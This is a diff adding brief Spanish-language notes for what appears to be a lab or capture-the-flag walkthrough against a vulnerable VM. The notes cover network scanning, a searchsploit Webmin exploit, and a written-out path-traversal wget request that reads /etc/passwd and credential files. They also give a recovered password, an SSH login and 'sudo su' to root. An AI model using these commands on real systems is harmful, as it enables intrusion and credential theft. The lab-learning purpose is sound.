@@ -1,0 +1,45 @@
+> arp-scan
+10.2.15
+mirar hosts.txt
+
+> nmap -sS -sV -p- -n 10.0.2.15
+ mirar ports.txt
+ 
+> searchsploit webmin
+> searchsploit -x multiple/remote/1997.php > webmin_exploit.php
+> php webmin_exploit.php
+-> inspeccionar código y ver que se genera una cadena muy URL muy grande con /..%01
+
+> wget 10.0.2.15:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01//etc/passwd
+
+> cat passwd
+...
+vulnosadmin:*:.......
+...
+
+tras obtener /etc/passwd obtener /etc/shadow /etc/ldap.secret
+>cat ldadp.secret
+canuhackme
+
+entrar por ssh 
+> ssh -oHostKeyAlgorithms=+ssh-dss vulnosadmin@10.0.2.15
+
+ -oHostKeyAlgorithms=+ssh-dss porque el ssh de la máquina víctima es antigua y necesita que especifiquemos que usaremos un algoritmo que ella entienda.
+ 
+mostrar comandos que se pueden ejecutar con mayores privilegios 
+>sudo -l
+
+mostrar ficheros que tengan el flag suid activo:
+find / -perm /4000 2>/dev/null
+/bin/su
+/bin/sudo
+
+>sudo su
+set vulnosadmin password
+>whoami
+root
+>cd 
+>ls -la
+>cat hello.txt
+
+
